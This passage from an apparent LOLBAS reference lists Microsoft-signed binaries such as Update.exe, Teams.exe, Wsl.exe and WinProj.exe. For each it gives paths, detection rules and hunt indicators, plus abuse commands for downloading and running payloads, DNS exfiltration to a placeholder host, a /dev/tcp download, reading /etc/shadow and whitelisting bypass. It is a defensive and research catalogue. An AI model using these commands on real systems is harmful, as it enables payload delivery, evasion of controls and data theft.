- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_mssql_sqlps_susp_execution.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/image_load/image_load_dll_system_management_automation_susp_load.yml), [Elastic](https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/execution_suspicious_powershell_imgload.toml), [Splunk](https://github.com/splunk/security_content/blob/aa9f7e0d13a61626c69367290ed1b7b71d1281fd/docs/_posts/2021-10-05-suspicious_copy_on_system32.md)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `Sqlps.exe -noprofile` | Execute PowerShell commands without ScriptBlock logging. |

### `SQLToolsPS.exe` (`yml/OtherMSBinaries/Sqltoolsps.yml`)
- **Description:** Tool included with Microsoft SQL that loads SQL Server cmdlts. A replacement for sqlps.exe. Successor to sqlps.exe in SQL Server 2016+.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Sqltoolsps.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Sqltoolsps.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Sqltoolsps.yml`
- **Default Windows Paths:** `C:\Program files (x86)\Microsoft SQL Server\130\Tools\Binn\sqlps.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_mssql_sqltoolsps_susp_execution.yml), [Splunk](https://github.com/splunk/security_content/blob/aa9f7e0d13a61626c69367290ed1b7b71d1281fd/docs/_posts/2021-10-05-suspicious_copy_on_system32.md)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `SQLToolsPS.exe -noprofile -command Start-Process calc.exe` | Execute PowerShell command. |

### `Squirrel.exe` (`yml/OtherMSBinaries/Squirrel.yml`)
- **Description:** Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Squirrel.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Squirrel.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Squirrel.yml`
- **Default Windows Paths:** `%localappdata%\Microsoft\Teams\current\Squirrel.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1218` | `User` | `squirrel.exe --download [url to package]` | Download binary |
| **AWL Bypass** | `T1218` | `User` | `squirrel.exe --update [url to package]` | Download and execute binary |
| **Execute** | `T1218` | `User` | `squirrel.exe --update [url to package]` | Download and execute binary |
| **AWL Bypass** | `T1218` | `User` | `squirrel.exe --updateRoolback=[url to package]` | Download and execute binary |
| **Execute** | `T1218` | `User` | `squirrel.exe --updateRollback=[url to package]` | Download and execute binary |

### `te.exe` (`yml/OtherMSBinaries/Te.yml`)
- **Description:** Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Te.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Te.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Te.yml`
- **Default Windows Paths:** `no default`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_susp_use_of_te_bin.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1127` | `User` | `te.exe bypass.wsc` | Execute Visual Basic script stored in local Windows Script Component file. |
| **Execute** | `T1127` | `User` | `te.exe test.dll` | Execute DLL file. |

### `Teams.exe` (`yml/OtherMSBinaries/Teams.yml`)
- **Description:** Electron runtime binary which runs the Teams application
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Teams.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Teams.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Teams.yml`
- **Default Windows Paths:** `%LOCALAPPDATA%\Microsoft\Teams\current\Teams.exe`
- **Key Forensic / Hunt IOCs:** `%LOCALAPPDATA%\Microsoft\Teams\current\app directory created`; `%LOCALAPPDATA%\Microsoft\Teams\current\app.asar file created/modified by non-Teams installer/updater`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/43277f26fc1c81fc98fc79147b711189e901b757/rules/windows/process_creation/proc_creation_win_susp_electron_exeuction_proxy.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.015` | `User` | `teams.exe` | Execute JavaScript code |
| **Execute** | `T1218.015` | `User` | `teams.exe` | Execute JavaScript code |
| **Execute** | `T1218.015` | `User` | `teams.exe --disable-gpu-sandbox --gpu-launcher="C:\Windows\system32\cmd.exe /c ping google.com &&"` | Executes a process under a trusted Microsoft signed binary |

### `TestWindowRemoteAgent.exe` (`yml/OtherMSBinaries/Testwindowremoteagent.yml`)
- **Description:** TestWindowRemoteAgent.exe is the command-line tool to establish RPC
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Testwindowremoteagent.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Testwindowremoteagent.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Testwindowremoteagent.yml`
- **Default Windows Paths:** `C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\RemoteAgent\TestWindowRemoteAgent.exe`
- **Key Forensic / Hunt IOCs:** `TestWindowRemoteAgent.exe spawning unexpectedly`

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Upload** | `T1048` | `User` | `TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000` | Attackers may utilize this to exfiltrate data over DNS |

### `Tracker.exe` (`yml/OtherMSBinaries/Tracker.yml`)
- **Description:** Tool included with Microsoft .Net Framework.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Tracker.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Tracker.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Tracker.yml`
- **Default Windows Paths:** `no default`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_tracker.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1127` | `User` | `Tracker.exe /d .\calc.dll /c C:\Windows\write.exe` | Injection of locally stored DLL file into target process. |
| **AWL Bypass** | `T1127` | `User` | `Tracker.exe /d .\calc.dll /c C:\Windows\write.exe` | Injection of locally stored DLL file into target process. |

### `Update.exe` (`yml/OtherMSBinaries/Update.yml`)
- **Description:** Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Update.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Update.yml`
- **Default Windows Paths:** `%localappdata%\Microsoft\Teams\update.exe`
- **Key Forensic / Hunt IOCs:** `Update.exe spawned an unknown process`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1218` | `User` | `Update.exe --download [url to package]` | Download binary |
| **AWL Bypass** | `T1218` | `User` | `Update.exe --update=[url to package]` | Download and execute binary |
| **Execute** | `T1218` | `User` | `Update.exe --update=[url to package]` | Download and execute binary |
| **AWL Bypass** | `T1218` | `User` | `Update.exe --update=\\remoteserver\payloadFolder` | Download and execute binary |
| **Execute** | `T1218` | `User` | `Update.exe --update=\\remoteserver\payloadFolder` | Download and execute binary |
| **AWL Bypass** | `T1218` | `User` | `Update.exe --updateRollback=[url to package]` | Download and execute binary |
| **Execute** | `T1218` | `User` | `Update.exe --updateRollback=[url to package]` | Download and execute binary |
| **AWL Bypass** | `T1218` | `User` | `Update.exe --processStart payload.exe --process-start-args "whatever args"` | Application Whitelisting Bypass |
| **AWL Bypass** | `T1218` | `User` | `Update.exe --updateRollback=\\remoteserver\payloadFolder` | Download and execute binary |
| **Execute** | `T1218` | `User` | `Update.exe --updateRollback=\\remoteserver\payloadFolder` | Download and execute binary |
| **Execute** | `T1218` | `User` | `Update.exe --processStart payload.exe --process-start-args "whatever args"` | Execute binary |
| **Execute** | `T1547` | `User` | `Update.exe --createShortcut=payload.exe -l=Startup` | Execute binary |
| **Execute** | `T1070` | `User` | `Update.exe --removeShortcut=payload.exe -l=Startup` | Execute binary |

### `VSDiagnostics.exe` (`yml/OtherMSBinaries/VSDiagnostics.yml`)
- **Description:** Command-line tool used for performing diagnostics.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/VSDiagnostics.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/VSDiagnostics.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/VSDiagnostics.yml`
- **Default Windows Paths:** `C:\Program Files\Microsoft Visual Studio\2022\Community\Team Tools\DiagnosticsHub\Collector\VSDiagnostics.exe`
- **Detection Rules:** [Sigma](https://github.com/tsale/Sigma_rules/blob/d5b4a09418edfeeb3a2d654f556d5bca82003cd7/LOL_BINs/VSDiagnostics_LoLBin.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1127` | `User` | `VSDiagnostics.exe start 1 /launch:calc.exe` | Proxy execution of binary |
| **Execute** | `T1127` | `User` | `VSDiagnostics.exe start 2 /launch:cmd.exe /launchArgs:"/c calc.exe"` | Proxy execution of binary with arguments |

### `VSIISExeLauncher.exe` (`yml/OtherMSBinaries/VSIISExeLauncher.yml`)
- **Description:** Binary will execute specified binary. Part of VS/VScode installation.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/VSIISExeLauncher.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/VSIISExeLauncher.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/VSIISExeLauncher.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\IDE\Extensions\Microsoft\Web Tools\ProjectSystem\VSIISExeLauncher.exe`
- **Key Forensic / Hunt IOCs:** `VSIISExeLauncher.exe spawned an unknown process`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_vsiisexelauncher.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `VSIISExeLauncher.exe -p [PATH_TO_BIN] -a "argument here"` | Execute any binary with given arguments. |

### `VisualUiaVerifyNative.exe` (`yml/OtherMSBinaries/VisualUiaVerifyNative.yml`)
- **Description:** A Windows SDK binary for manual and automated testing of Microsoft UI Automation implementation and controls.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/VisualUiaVerifyNative.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/VisualUiaVerifyNative.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/VisualUiaVerifyNative.yml`
- **Default Windows Paths:** `c:\Program Files (x86)\Windows Kits\10\bin\[SDK version]\arm64\UIAVerify\VisualUiaVerifyNative.exe`, `c:\Program Files (x86)\Windows Kits\10\bin\[SDK version]\x64\UIAVerify\VisualUiaVerifyNative.exe`, `c:\Program Files (x86)\Windows Kits\10\bin\[SDK version]\UIAVerify\VisualUiaVerifyNative.exe`
- **Key Forensic / Hunt IOCs:** `As a Windows SDK binary, execution on a system may be suspicious`
- **Detection Rules:** [BlockRule](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules), [Sigma](https://github.com/SigmaHQ/sigma/blob/6b34764215b0e97e32cbc4c6325fc933d2695c3a/rules/windows/process_creation/proc_creation_win_lolbin_visualuiaverifynative.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **AWL Bypass** | `T1218` | `User` | `VisualUiaVerifyNative.exe` | Execute proxied payload with Microsoft signed binary to bypass WDAC policies |

### `Vshadow.exe` (`yml/OtherMSBinaries/Vshadow.yml`)
- **Description:** VShadow is a command-line tool that can be used to create and manage volume shadow copies.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Vshadow.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Vshadow.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Vshadow.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Windows Kits\10\bin\10.0.XXXXX.0\x64\vshadow.exe`
- **Key Forensic / Hunt IOCs:** `vshadow.exe usage with -exec parameter`

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1127` | `Administrator` | `vshadow.exe -nw -exec=c:\windows\system32\calc.exe C:` | Performs execution of specified executable file. |

### `vsjitdebugger.exe` (`yml/OtherMSBinaries/Vsjitdebugger.yml`)
- **Description:** Just-In-Time (JIT) debugger included with Visual Studio
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Vsjitdebugger.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Vsjitdebugger.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Vsjitdebugger.yml`
- **Default Windows Paths:** `c:\windows\system32\vsjitdebugger.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_susp_use_of_vsjitdebugger_bin.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1127` | `User` | `Vsjitdebugger.exe calc.exe` | Execution of local PE file as a subprocess of Vsjitdebugger.exe. |

### `Wfc.exe` (`yml/OtherMSBinaries/Wfc.yml`)
- **Description:** The Workflow Command-line Compiler tool is included with the Windows Software Development Kit (SDK).
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Wfc.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Wfc.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Wfc.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\wfc.exe`
- **Key Forensic / Hunt IOCs:** `As a Windows SDK binary, execution on a system may be suspicious`
- **Detection Rules:** [BlockRule](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules), [Sigma](https://github.com/SigmaHQ/sigma/blob/6b34764215b0e97e32cbc4c6325fc933d2695c3a/rules/windows/process_creation/proc_creation_win_lolbin_wfc.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **AWL Bypass** | `T1127` | `User` | `wfc.exe c:\path\to\test.xoml` | Execute proxied payload with Microsoft signed binary to bypass WDAC policies |

### `WinProj.exe` (`yml/OtherMSBinaries/Winproj.yml`)
- **Description:** Microsoft Project Executable
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Winproj.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Winproj.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Winproj.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Microsoft Office\Office14\WinProj.exe`, `C:\Program Files\Microsoft Office\Office14\WinProj.exe`, `C:\Program Files (x86)\Microsoft Office\Office15\WinProj.exe`, `C:\Program Files\Microsoft Office\Office15\WinProj.exe` (+8 more)
- **Key Forensic / Hunt IOCs:** `URL on a WinProj command line`; `WinProj making unexpected network connections or DNS requests`

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `WinProj.exe https://example.com/payload` | It will download a remote payload and place it in INetCache. |

### `Winword.exe` (`yml/OtherMSBinaries/Winword.yml`)
- **Description:** Microsoft Office binary
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Winword.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Winword.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Winword.yml`
- **Default Windows Paths:** `C:\Program Files\Microsoft Office\root\Office16\winword.exe`, `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\winword.exe`, `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\winword.exe`, `C:\Program Files (x86)\Microsoft Office\Office16\winword.exe` (+12 more)
- **Key Forensic / Hunt IOCs:** `Suspicious Office application Internet/network traffic`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_office_arbitrary_cli_download.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `winword.exe "http://192.168.1.10/TeamsAddinLoader.dll"` | It will download a remote payload and place it in INetCache. |

### `Wsl.exe` (`yml/OtherMSBinaries/Wsl.yml`)
- **Description:** Windows subsystem for Linux executable
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Wsl.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Wsl.yml`
- **Default Windows Paths:** `C:\Windows\System32\wsl.exe`
- **Key Forensic / Hunt IOCs:** `Child process from wsl.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_wsl_lolbin_execution.yml), [BlockRule](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1202` | `User` | `wsl.exe -e /mnt/c/Windows/System32/calc.exe` | Performs execution of specified file, can be used to execute arbitrary Linux commands. |
| **Execute** | `T1202` | `User` | `wsl.exe -u root -e cat /etc/shadow` | Performs execution of arbitrary Linux commands as root without need for password. |
| **Execute** | `T1202` | `User` | `wsl.exe --exec bash -c 'cat file'` | Performs execution of arbitrary Linux commands. |
| **Execute** | `T1202` | `User` | `wsl.exe --system calc.exe` | Performs execution of arbitrary Linux commands as root without need for password. |
| **Download** | `T1202` | `User` | `wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'` | Download file |

### `devtunnel.exe` (`yml/OtherMSBinaries/devtunnels.yml`)
- **Description:** Binary to enable forwarded ports on windows operating systems.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/devtunnels.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/devtunnels.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/devtunnels.yml`
- **Default Windows Paths:** `C:\Users\<username>\AppData\Local\Temp\.net\devtunnel\`, `C:\Users\<username>\AppData\Local\Temp\DevTunnels`
- **Key Forensic / Hunt IOCs:** `devtunnel.exe binary spawned`; `*.devtunnels.ms`; `*.*.devtunnels.ms`

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `devtunnel.exe host -p 8080` | Download Files, Upload Files, Data Exfiltration |

### `vsls-agent.exe` (`yml/OtherMSBinaries/vsls-agent.yml`)
- **Description:** Agent for Visual Studio Live Share (Code Collaboration)
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/vsls-agent.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/vsls-agent.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/vsls-agent.yml`
- **Default Windows Paths:** `c:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\Common7\IDE\Extensions\Microsoft\LiveShare\Agent\vsls-agent.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_vslsagent_agentextensionpath_load.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `vsls-agent.exe --agentExtensionPath c:\path\to\payload.dll` | Execute proxied payload with Microsoft signed binary |

### `vstest.console.exe` (`yml/OtherMSBinaries/vstest.console.yml`)
- **Description:** VSTest.Console.exe is the command-line tool to run tests
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/vstest.console.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/vstest.console.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/vstest.console.yml`
- **Default Windows Paths:** `C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\vstest.console.exe`, `C:\Program Files (x86)\Microsoft Visual Studio\2022\TestAgent\Common7\IDE\CommonExtensions\Microsoft\TestWindow\vstest.console.exe`
- **Key Forensic / Hunt IOCs:** `vstest.console.exe spawning unexpected processes`

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **AWL Bypass** | `T1127` | `User` | `vstest.console.exe testcode.dll` | Proxy Execution and AWL bypass, Adversaries may run malicious code embedded inside the test methods of crafted dll/exe |

